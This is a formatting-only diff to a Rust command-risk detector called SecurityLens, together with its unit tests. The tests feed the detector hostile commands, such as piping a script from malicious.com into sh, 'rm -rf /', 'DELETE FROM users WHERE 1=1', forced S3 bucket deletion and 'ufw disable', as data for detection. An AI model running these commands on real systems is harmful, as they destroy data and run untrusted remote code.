@@ -159,16 +159,11 @@ struct DetectionRecord {
 #[allow(dead_code)]
 impl RateLimitTracker {
     fn new() -> Self {
-        Self {
-            detections: Vec::new(),
-        }
+        Self { detections: Vec::new() }
     }
 
     fn record_detection(&mut self, risk_level: RiskLevel, category: &str, command: &str) {
-        let timestamp = SystemTime::now()
-            .duration_since(UNIX_EPOCH)
-            .unwrap_or_default()
-            .as_secs();
+        let timestamp = SystemTime::now().duration_since(UNIX_EPOCH).unwrap_or_default().as_secs();
 
         let command_hash = self.hash_command(command);
 
@@ -185,14 +180,10 @@ impl RateLimitTracker {
             return false;
         }
 
-        let now = SystemTime::now()
-            .duration_since(UNIX_EPOCH)
-            .unwrap_or_default()
-            .as_secs();
+        let now = SystemTime::now().duration_since(UNIX_EPOCH).unwrap_or_default().as_secs();
 
         // Clean up old records
-        self.detections
-            .retain(|record| now - record.timestamp < config.window_seconds);
+        self.detections.retain(|record| now - record.timestamp < config.window_seconds);
 
         // Check if we've exceeded the limit
         self.detections.len() >= config.max_detections as usize
@@ -971,10 +962,7 @@ impl SecurityLens {
         }
 
         // Check rate limiting first
-        if self
-            .rate_limit_tracker
-            .is_rate_limited(&self.policy.rate_limit)
-        {
+        if self.rate_limit_tracker.is_rate_limited(&self.policy.rate_limit) {
             warn!("Security Lens rate limit exceeded for command analysis");
             return CommandRisk {
                 level: RiskLevel::Warning,
@@ -1008,8 +996,7 @@ impl SecurityLens {
                     highest_risk = *risk_level;
                 }
                 // Record detection for rate limiting
-                self.rate_limit_tracker
-                    .record_detection(*risk_level, &factor.category, command);
+                self.rate_limit_tracker.record_detection(*risk_level, &factor.category, command);
             }
         }
 
@@ -1022,8 +1009,7 @@ impl SecurityLens {
                     highest_risk = *risk_level;
                 }
                 // Record detection for rate limiting
-                self.rate_limit_tracker
-                    .record_detection(*risk_level, &factor.category, command);
+                self.rate_limit_tracker.record_detection(*risk_level, &factor.category, command);
             }
         }
 
@@ -1088,11 +1074,8 @@ impl SecurityLens {
         let explanation = self.generate_explanation(&risk_factors, &highest_risk);
         let mitigations = self.generate_mitigations(&risk_factors);
         let mitigation_links = self.generate_mitigation_links(&risk_factors);
-        let requires_confirmation = *self
-            .policy
-            .require_confirmation
-            .get(&highest_risk)
-            .unwrap_or(&false);
+        let requires_confirmation =
+            *self.policy.require_confirmation.get(&highest_risk).unwrap_or(&false);
 
         // Log detection if significant
         if highest_risk != RiskLevel::Safe {
@@ -1106,11 +1089,7 @@ impl SecurityLens {
                 "Command analyzed: '{}' -> {:?} (factors: {})",
                 command.chars().take(50).collect::<String>(),
                 highest_risk,
-                risk_factors
-                    .iter()
-                    .map(|f| f.category.as_str())
-                    .collect::<Vec<&str>>()
-                    .join(", ")
+                risk_factors.iter().map(|f| f.category.as_str()).collect::<Vec<&str>>().join(", ")
             );
         }
 
@@ -1619,10 +1598,7 @@ impl SecurityLens {
         use std::collections::hash_map::DefaultHasher;
         use std::hash::{Hash, Hasher};
 
-        let timestamp = SystemTime::now()
-            .duration_since(UNIX_EPOCH)
-            .unwrap_or_default()
-            .as_nanos();
+        let timestamp = SystemTime::now().duration_since(UNIX_EPOCH).unwrap_or_default().as_nanos();
 
         let mut hasher = DefaultHasher::new();
         timestamp.hash(&mut hasher);
@@ -1657,11 +1633,8 @@ impl SecurityLens {
 
         // Only return risk if it's above Safe and requires confirmation
         if highest_risk != RiskLevel::Safe {
-            let requires_confirmation = *self
-                .policy
-                .require_confirmation
-                .get(&highest_risk)
-                .unwrap_or(&false);
+            let requires_confirmation =
+                *self.policy.require_confirmation.get(&highest_risk).unwrap_or(&false);
 
             if requires_confirmation {
                 let mitigations = self.generate_mitigations(&all_factors);
@@ -1891,11 +1864,7 @@ impl Default for SecurityPolicy {
             platform_groups: vec![],
             gate_paste_events: true,
             docs_base_url: String::new(),
-            rate_limit: RateLimitConfig {
-                max_detections: 5,
-                window_seconds: 60,
-                enabled: true,
-            },
+            rate_limit: RateLimitConfig { max_detections: 5, window_seconds: 60, enabled: true },
         }
     }
 }
@@ -2019,10 +1988,7 @@ mod tests {
         assert!(risk.factors.iter().any(|f| f.category == "custom"));
 
         // Disabled policy should always return Safe
-        let disabled = SecurityPolicy {
-            enabled: false,
-            ..SecurityPolicy::default()
-        };
+        let disabled = SecurityPolicy { enabled: false, ..SecurityPolicy::default() };
         let mut lens_disabled = SecurityLens::new(disabled);
         let risk = lens_disabled.analyze_command("rm -rf /");
         assert_eq!(risk.level, RiskLevel::Safe);
@@ -2069,10 +2035,7 @@ mod tests {
 
     #[test]
     fn test_paste_content_analysis() {
-        let policy = SecurityPolicy {
-            gate_paste_events: true,
-            ..SecurityPolicy::default()
-        };
+        let policy = SecurityPolicy { gate_paste_events: true, ..SecurityPolicy::default() };
         let mut lens = SecurityLens::new(policy);
 
         // Test safe paste content
@@ -2098,29 +2061,19 @@ mod tests {
         assert!(!risk.mitigation_links.is_empty());
 
         // Check that we have the expected risk factors
-        assert!(risk
-            .factors
-            .iter()
-            .any(|f| f.category == "system_destruction"));
+        assert!(risk.factors.iter().any(|f| f.category == "system_destruction"));
 
         // Check that we have mitigation links that correspond to the detected categories
-        let has_system_safety = risk
-            .mitigation_links
-            .iter()
-            .any(|l| l.url.contains("system-safety"));
-        let has_file_operations = risk
-            .mitigation_links
-            .iter()
-            .any(|l| l.url.contains("safe-file-operations"));
+        let has_system_safety =
+            risk.mitigation_links.iter().any(|l| l.url.contains("system-safety"));
+        let has_file_operations =
+            risk.mitigation_links.iter().any(|l| l.url.contains("safe-file-operations"));
 
         // Should have at least one of these links since both categories are detected
         assert!(
             has_system_safety || has_file_operations,
             "Expected either system-safety or safe-file-operations link, got: {:?}",
-            risk.mitigation_links
-                .iter()
-                .map(|l| &l.url)
-                .collect::<Vec<_>>()
+            risk.mitigation_links.iter().map(|l| &l.url).collect::<Vec<_>>()
         );
 
         // Verify link structure
@@ -2137,26 +2090,17 @@ mod tests {
         // Mass deletion
         let risk = lens.analyze_command("rm -rf /var/*");
         assert_eq!(risk.level, RiskLevel::Warning);
-        assert!(risk
-            .factors
-            .iter()
-            .any(|f| f.category == "filesystem_mass_delete"));
+        assert!(risk.factors.iter().any(|f| f.category == "filesystem_mass_delete"));
 
         // Permission exposure
         let risk = lens.analyze_command("chmod 777 /etc/passwd");
         assert_eq!(risk.level, RiskLevel::Warning);
-        assert!(risk
-            .factors
-            .iter()
-            .any(|f| f.category == "filesystem_permissions"));
+        assert!(risk.factors.iter().any(|f| f.category == "filesystem_permissions"));
 
         // System ownership change
         let risk = lens.analyze_command("chown user:group /usr/bin");
         assert_eq!(risk.level, RiskLevel::Caution);
-        assert!(risk
-            .factors
-            .iter()
-            .any(|f| f.category == "filesystem_system_ownership"));
+        assert!(risk.factors.iter().any(|f| f.category == "filesystem_system_ownership"));
     }
 
     #[test]
@@ -2166,18 +2110,12 @@ mod tests {
         // Remote execution
         let risk = lens.analyze_command("curl https://malicious.com/script.sh | sh");
         assert_eq!(risk.level, RiskLevel::Warning);
-        assert!(risk
-            .factors
-            .iter()
-            .any(|f| f.category == "network_remote_execution"));
+        assert!(risk.factors.iter().any(|f| f.category == "network_remote_execution"));
 
         // Executable download to PATH
         let risk = lens.analyze_command("wget https://example.com/binary -o /usr/local/bin/tool");
         assert_eq!(risk.level, RiskLevel::Caution);
-        assert!(risk
-            .factors
-            .iter()
-            .any(|f| f.category == "network_executable_download"));
+        assert!(risk.factors.iter().any(|f| f.category == "network_executable_download"));
 
         // Network scanning
         let risk = lens.analyze_command("nmap -sS 10.0.0.0/8");
@@ -2187,18 +2125,12 @@ mod tests {
             risk.factors.iter().map(|f| &f.category).collect::<Vec<_>>()
         );
         assert_eq!(risk.level, RiskLevel::Caution);
-        assert!(risk
-            .factors
-            .iter()
-            .any(|f| f.category == "network_scanning"));
+        assert!(risk.factors.iter().any(|f| f.category == "network_scanning"));
 
         // Firewall disable
         let risk = lens.analyze_command("ufw disable");
         assert_eq!(risk.level, RiskLevel::Warning);
-        assert!(risk
-            .factors
-            .iter()
-            .any(|f| f.category == "network_firewall_disable"));
+        assert!(risk.factors.iter().any(|f| f.category == "network_firewall_disable"));
     }
 
     #[test]
@@ -2208,35 +2140,23 @@ mod tests {
         // Global install
         let risk = lens.analyze_command("npm install -g dangerous-package");
         assert_eq!(risk.level, RiskLevel::Caution);
-        assert!(risk
-            .factors
-            .iter()
-            .any(|f| f.category == "package_global_install"));
+        assert!(risk.factors.iter().any(|f| f.category == "package_global_install"));
 
         // Untrusted source
         let risk = lens.analyze_command("pip install --trusted-host untrusted.com package");
         assert_eq!(risk.level, RiskLevel::Warning);
-        assert!(risk
-            .factors
-            .iter()
-            .any(|f| f.category == "package_untrusted_source"));
+        assert!(risk.factors.iter().any(|f| f.category == "package_untrusted_source"));
 
         // Auto removal
         let risk = lens.analyze_command("apt-get autoremove -y");
         assert_eq!(risk.level, RiskLevel::Warning);
-        assert!(risk
-            .factors
-            .iter()
-            .any(|f| f.category == "package_auto_remove"));
+        assert!(risk.factors.iter().any(|f| f.category == "package_auto_remove"));
 
         // Direct URL install
         let risk =
             lens.analyze_command("pip install https://github.com/user/repo/archive/main.zip");
         assert_eq!(risk.level, RiskLevel::Caution);
-        assert!(risk
-            .factors
-            .iter()
-            .any(|f| f.category == "package_direct_url"));
+        assert!(risk.factors.iter().any(|f| f.category == "package_direct_url"));
     }
 
     #[test]
@@ -2246,26 +2166,17 @@ mod tests {
         // AWS S3 force delete
         let risk = lens.analyze_command("aws s3 rb s3://important-bucket --force");
         assert_eq!(risk.level, RiskLevel::Critical);
-        assert!(risk
-            .factors
-            .iter()
-            .any(|f| f.category == "cloud_s3_force_delete"));
+        assert!(risk.factors.iter().any(|f| f.category == "cloud_s3_force_delete"));
 
         // GCP deletion
         let risk = lens.analyze_command("gcloud compute instances delete prod-instance --quiet");
         assert_eq!(risk.level, RiskLevel::Warning);
-        assert!(risk
-            .factors
-            .iter()
-            .any(|f| f.category == "cloud_gcp_deletion"));
+        assert!(risk.factors.iter().any(|f| f.category == "cloud_gcp_deletion"));
 
         // Azure resource group deletion
         let risk = lens.analyze_command("az group delete --name prod-rg --yes");
         assert_eq!(risk.level, RiskLevel::Warning);
-        assert!(risk
-            .factors
-            .iter()
-            .any(|f| f.category == "cloud_azure_rg_delete"));
+        assert!(risk.factors.iter().any(|f| f.category == "cloud_azure_rg_delete"));
     }
 
     #[test]
@@ -2275,26 +2186,17 @@ mod tests {
         // Production deletion
         let risk = lens.analyze_command("kubectl delete deployment app -n production");
         assert_eq!(risk.level, RiskLevel::Critical);
-        assert!(risk
-            .factors
-            .iter()
-            .any(|f| f.category == "kubernetes_prod_delete"));
+        assert!(risk.factors.iter().any(|f| f.category == "kubernetes_prod_delete"));
 
         // General k8s changes
         let risk = lens.analyze_command("kubectl apply -f deployment.yaml");
         assert_eq!(risk.level, RiskLevel::Warning);
-        assert!(risk
-            .factors
-            .iter()
-            .any(|f| f.category == "kubernetes_change"));
+        assert!(risk.factors.iter().any(|f| f.category == "kubernetes_change"));
 
         // Helm production delete
         let risk = lens.analyze_command("helm delete myapp -n production");
         assert_eq!(risk.level, RiskLevel::Warning);
-        assert!(risk
-            .factors
-            .iter()
-            .any(|f| f.category == "kubernetes_helm_delete"));
+        assert!(risk.factors.iter().any(|f| f.category == "kubernetes_helm_delete"));
     }
 
     #[test]
@@ -2304,26 +2206,17 @@ mod tests {
         // Data wipe
         let risk = lens.analyze_command("DELETE FROM users WHERE 1=1");
         assert_eq!(risk.level, RiskLevel::Critical);
-        assert!(risk
-            .factors
-            .iter()
-            .any(|f| f.category == "database_data_wipe"));
+        assert!(risk.factors.iter().any(|f| f.category == "database_data_wipe"));
 
         // User management
         let risk = lens.analyze_command("GRANT ALL PRIVILEGES ON * TO user");
         assert_eq!(risk.level, RiskLevel::Warning);
-        assert!(risk
-            .factors
-            .iter()
-            .any(|f| f.category == "database_user_mgmt"));
+        assert!(risk.factors.iter().any(|f| f.category == "database_user_mgmt"));
 
         // Database deletion
         let risk = lens.analyze_command("DROP DATABASE important_db");
         assert_eq!(risk.level, RiskLevel::Warning);
-        assert!(risk
-            .factors
-            .iter()
-            .any(|f| f.category == "database_deletion"));
+        assert!(risk.factors.iter().any(|f| f.category == "database_deletion"));
     }
 
     #[test]
@@ -2333,18 +2226,12 @@ mod tests {
         // Privileged container
         let risk = lens.analyze_command("docker run --privileged -it ubuntu");
         assert_eq!(risk.level, RiskLevel::Warning);
-        assert!(risk
-            .factors
-            .iter()
-            .any(|f| f.category == "container_privileged"));
+        assert!(risk.factors.iter().any(|f| f.category == "container_privileged"));
 
         // System cleanup
         let risk = lens.analyze_command("docker system prune -a");
         assert_eq!(risk.level, RiskLevel::Warning);
-        assert!(risk
-            .factors
-            .iter()
-            .any(|f| f.category == "container_cleanup"));
+        assert!(risk.factors.iter().any(|f| f.category == "container_cleanup"));
     }
 
     #[test]
@@ -2354,26 +2241,17 @@ mod tests {
         // Terraform destroy
         let risk = lens.analyze_command("terraform destroy");
         assert_eq!(risk.level, RiskLevel::Warning);
-        assert!(risk
-            .factors
-            .iter()
-            .any(|f| f.category == "iac_terraform_destroy"));
+        assert!(risk.factors.iter().any(|f| f.category == "iac_terraform_destroy"));
 
         // Force unlock
         let risk = lens.analyze_command("terraform force-unlock abc123");
         assert_eq!(risk.level, RiskLevel::Warning);
-        assert!(risk
-            .factors
-            .iter()
-            .any(|f| f.category == "iac_terraform_unlock"));
+        assert!(risk.factors.iter().any(|f| f.category == "iac_terraform_unlock"));
 
         // Pulumi destroy
         let risk = lens.analyze_command("pulumi destroy --yes");
         assert_eq!(risk.level, RiskLevel::Warning);
-        assert!(risk
-            .factors
-            .iter()
-            .any(|f| f.category == "iac_pulumi_destroy"));
+        assert!(risk.factors.iter().any(|f| f.category == "iac_pulumi_destroy"));
     }
 
     #[test]
@@ -2398,10 +2276,7 @@ mod tests {
         // Critical service stop
         let risk = lens.analyze_command("systemctl stop ssh");
         assert_eq!(risk.level, RiskLevel::Critical);
-        assert!(risk
-            .factors
-            .iter()
-            .any(|f| f.category == "service_critical_stop"));
+        assert!(risk.factors.iter().any(|f| f.category == "service_critical_stop"));
 
         // General service control
         let risk = lens.analyze_command("systemctl disable apache2");
@@ -2416,26 +2291,17 @@ mod tests {
         // Weak crypto generation
         let risk = lens.analyze_command("ssh-keygen -N '' -f ~/.ssh/weak_key");
         assert_eq!(risk.level, RiskLevel::Warning);
-        assert!(risk
-            .factors
-            .iter()
-            .any(|f| f.category == "crypto_weak_keys"));
+        assert!(risk.factors.iter().any(|f| f.category == "crypto_weak_keys"));
 
         // History manipulation
         let risk = lens.analyze_command("history -c");
         assert_eq!(risk.level, RiskLevel::Caution);
-        assert!(risk
-            .factors
-            .iter()
-            .any(|f| f.category == "shell_history_clear"));
+        assert!(risk.factors.iter().any(|f| f.category == "shell_history_clear"));
 
         // Sensitive environment export
         let risk = lens.analyze_command("export PASSWORD=secret123");
         assert_eq!(risk.level, RiskLevel::Warning);
-        assert!(risk
-            .factors
-            .iter()
-            .any(|f| f.category == "env_sensitive_export"));
+        assert!(risk.factors.iter().any(|f| f.category == "env_sensitive_export"));
     }
 
     #[test]
@@ -2447,10 +2313,8 @@ mod tests {
             message: "Using production danger tool".to_string(),
         };
 
-        let policy = SecurityPolicy {
-            custom_patterns: vec![custom_pattern],
-            ..SecurityPolicy::default()
-        };
+        let policy =
+            SecurityPolicy { custom_patterns: vec![custom_pattern], ..SecurityPolicy::default() };
 
         let mut lens = SecurityLens::new(policy);
         let risk = lens.analyze_command("danger-tool --prod");
@@ -2460,16 +2324,10 @@ mod tests {
 
     #[test]
     fn test_rate_limiting_functionality() {
-        let rate_limit_config = RateLimitConfig {
-            max_detections: 2,
-            window_seconds: 60,
-            enabled: true,
-        };
+        let rate_limit_config =
+            RateLimitConfig { max_detections: 2, window_seconds: 60, enabled: true };
 
-        let policy = SecurityPolicy {
-            rate_limit: rate_limit_config,
-            ..SecurityPolicy::default()
-        };
+        let policy = SecurityPolicy { rate_limit: rate_limit_config, ..SecurityPolicy::default() };
 
         let mut lens = SecurityLens::new(policy);
 
